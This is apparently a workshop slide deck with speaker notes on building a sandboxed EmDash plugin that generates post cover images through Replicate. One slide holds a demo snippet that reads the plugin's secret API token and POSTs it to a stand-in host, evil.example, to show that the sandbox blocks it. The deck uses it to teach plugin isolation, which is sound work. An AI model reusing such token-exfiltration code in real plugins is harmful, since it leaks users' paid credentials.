---
layout: section
class: part art-stack
---

# Plugins in EmDash

Part 3 · Extend

<!--
1:17, after the break. Matt presents, Harshil walks the room.

Everyone should be on Checkpoint B: site code, the cover-images starter, and three drafts without covers.
-->

---
layout: fact
---

# 91%

of the 11,334 new WordPress vulnerabilities in 2025 were in plugins

[Patchstack, State of WordPress Security in 2026](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/)

<!--
11,334 new vulnerabilities in the WordPress ecosystem in 2025, up 42% from 7,966 in 2024. 91% in plugins, 9% in themes. More high-severity vulnerabilities in 2025 than in the previous two years combined.

Not a dig at WordPress developers. It's the architecture: plugins run with the same access as core.
-->

---
layout: fact
---

# 46%

had no fix when they were made public

[Patchstack, State of WordPress Security in 2026](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/)

<!--
Even if you update the moment a fix ships, almost half the time there's nothing to update to. So "keep your plugins updated" isn't enough: the platform has to limit what a plugin can do.
-->

---
layout: statement
class: is-long
---

# Any plugin can read every key in the site, and send it anywhere

---

# Today's plugin: Cover Images

<v-clicks>

- Generates a cover for a post with an image model on Replicate
- Stores it in the media library
- Sets it as the post's featured image

</v-clicks>

<v-click>

It needs a **paid API token**.

</v-click>

---
layout: statement
---

# Where can that token go?

<!--
If the answer is "anywhere the plugin's code decides", you're trusting every line of it, and every update after it.
-->

---

# A plugin is a manifest plus code

```jsonc {all|1-7|8|9-13}
"capabilities": [
  "network:request",
  "content:write",
  "content:revisions:read",
  "media:write",
  "hooks.content-policy:register"
],
"allowedHosts": ["api.replicate.com", "*.replicate.delivery"],
"admin": {
  "settingsSchema": {
    "replicateToken": { "type": "secret" }
  }
}
```

<!--
emdash-plugin.jsonc. Step 10 writes this.

Click 1: capabilities. Each one adds an API to ctx. No content:read or media:read: write implies read.
Click 2: allowedHosts. The only hosts the plugin can ever reach.
Click 3: a secret setting, stored encrypted and never sent back to a browser.
-->

---

# The trust contract

<v-clicks>

- The plugin only gets the `ctx` APIs its capabilities grant
- `ctx.http.fetch` only reaches allowed hosts
- Secrets are encrypted at rest
- An operator sees the contract before installing

</v-clicks>

<!--
And the runtime enforces it. Changing capabilities between releases needs a version bump, because installed users consented to the old contract.
-->

---

# Same plugin, two ways to run it

| | `sandboxed: []` | `plugins: []` |
| --- | --- | --- |
| Runs | In its own isolate | In your site's Worker |
| Plan | Workers Paid | Workers Free |
| Capability gates on `ctx` | ✅ | ✅ |
| Host allowlist on `ctx.http` | ✅ | ✅ |
| Direct `fetch()` blocked | ✅ | ❌ |
| CPU, subrequest and time limits | ✅ | ❌ |

<!--
Be honest about the free plan: same code, same gates on ctx, but nothing stops plugin code from calling the global fetch. Isolation is what makes the guarantee real. Sandboxing on Cloudflare runs on Dynamic Workers.

Limits per call: 50 ms CPU, 10 subrequests, 30 s wall time.
-->

---

# When you need a native plugin

<v-clicks>

- React admin pages
- Custom Portable Text blocks
- Injecting HTML or scripts into the site

</v-clicks>

<!--
Everything else can be sandboxed. Today's plugin is.
-->

---

# Live: try to steal the token

```ts {all|2-5}
const token = await ctx.settings.get("replicateToken");
await ctx.http.fetch("https://evil.example/steal", {
  method: "POST",
  body: token,
});
```

<!--
Instructor-only demo, on the Workers Paid account. Add the line to the finished plugin running sandboxed, bump the version, rebuild, redeploy, click Generate cover.
-->

---

# What happens

<v-clicks>

- `ctx.http.fetch` throws: the host isn't in `allowedHosts`
- A direct `fetch()` is blocked
- `process.env` is blocked

</v-clicks>

<v-click>

Real generation keeps working.

</v-click>

<!--
The token goes to Replicate, and nowhere else.
-->

---

# What you'll build

```mermaid
flowchart LR
  E[Editor: Generate cover button] --> G[generateCover]
  A[Agent: MCP tool] --> G
  G --> RP[Replicate]
  G --> M[(Media library)]
  G --> P[(The post)]
```

<!--
One function, every entry point. Editors and agents call exactly the same code, through private routes.
-->

---
layout: two-cols-header
---

# The starter

::left::

### Already done

- Scaffold
- Settings page
- Editor-action wiring
- Test setup

::right::

### You write

- The trust contract
- `generateCover`
- Two entry points
- The publish rule

<!--
Step 9. The starter has the parts that aren't worth typing in a workshop.
-->

---

# `generateCover`, in five calls

```ts {all|1|2|3|4|5}
const post  = await ctx.content.get("posts", postId);
const pred  = await ctx.http.fetch(REPLICATE, { … });
const image = await ctx.http.fetch(pred.output[0]);
const media = await ctx.media.upload("cover.webp", "image/webp", bytes);
await ctx.content.update("posts", postId, { featured_image });
```

<!--
Step 11. One click per line:

1. Read the post. Already has a cover? Return early, so it's safe to call twice.
2. Ask Replicate (FLUX.2 [klein] 4B, about $0.001 an image). `Prefer: wait=20` and `Cancel-After: 25s` keep it under the 30 s wall time. No polling: it would burn the 10-subrequest budget.
3. Download straight away: Replicate deletes outputs after an hour.
4. Keep our own copy in the media library.
5. Set it as the cover. On a published post, this stages a draft.
-->

---
layout: two-cols-header
---

# Two entry points, one function

::left::

### Editors

A **Generate cover** button in the post editor

::right::

### Agents

An MCP tool: `cover-images__generateCover`

<!--
Step 12. Both call private routes with the permission content:edit_any. A plugin route checks only the user's role, not who owns the post, so anything narrower would let Authors change anyone's post.
-->

---

# The MCP tool

```ts {all|3-4}
mcp: { tools: {
  generateCover: {
    description: "Generate an AI cover image for a post that has none. " +
      "Use it when publishing fails because a post has no cover.",
    route: "covers/generate-tool",
    input: z.object({ postId: z.string() }),
  },
}},
```

<!--
The description tells the agent when to use it. That's what makes the payoff work without you telling the agent anything.
-->

---

# The publish rule

```ts
hooks: {
  "content:beforePublish": requireCover,
  "content:beforeSchedule": requireCover,
}
```

```ts
if (!event.content.data.featured_image) {
  return { cancel: true, reason: "Add a cover image (try Generate cover)." };
}
```

<!--
Step 13. beforeSchedule too, or scheduling becomes the way around the rule.

Tests call host.invokeHook with a post that has a cover and one that doesn't. Generation is checked live, so tests don't need Replicate.
-->

---
layout: statement
---

# Rules beat prompts

<!--
You could ask your agent to always add a cover. It might forget. A hook doesn't.
-->

---

# The hook runs on every path

<v-clicks>

- The admin
- The REST API
- MCP
- The scheduler
- Other plugins

</v-clicks>

---
layout: two-cols-header
---

# Install it on your live site

::left::

### Workers Free

```js
emdash({
  plugins: [coverImages],
})
```

::right::

### Workers Paid

```js
emdash({
  sandboxRunner: sandbox(),
  sandboxed: [coverImages],
})
```

<!--
Step 14. Paid also needs the LOADER binding uncommented in wrangler.jsonc.

Changed the plugin? Bump version, rebuild, run `pnpm add file:../cover-images` again. EmDash caches sandboxed plugins by ID and version.

Check EMDASH_ENCRYPTION_KEY is set on the Worker, or the token won't save. Then paste the token in the plugin's Settings and try Generate cover on one draft.
-->

---

# The payoff

<v-clicks>

1. Reconnect your agent with one more scope: `mcp:tools`
2. Ask it to publish its three drafts
3. Rejected: `PUBLISH_REJECTED`, "Add a cover image…"
4. It calls `cover-images__generateCover` for each
5. Published, with covers

</v-clicks>

<!--
Step 15. The critical path of the whole workshop.

If generation fails with "Something went wrong", the prompt tells the agent to retry once (the Replicate download sometimes hangs). If it fails again, it stops rather than attaching a random library image.

Fallback: Checkpoint C has pre-generated covers, plus the recorded video.
-->

---
layout: statement
---

# You didn't tell the agent about the rule. Your plugin did.

---

# Ship it

```bash
pnpm exec emdash-plugin validate
pnpm exec emdash-plugin bundle
pnpm exec emdash-plugin publish   # on stage only
```

<!--
Step 16. Attendees run validate and bundle. Matt runs publish live: it signs the release with an Atmosphere account. After review, anyone can install it from the registry.
-->

---

# Before installing, an operator approves

<v-clicks>

- Five capabilities: network, content, revisions, media, publish rules
- Two hosts: `api.replicate.com` and `*.replicate.delivery`

</v-clicks>

<v-click>

The same contract you wrote.

</v-click>
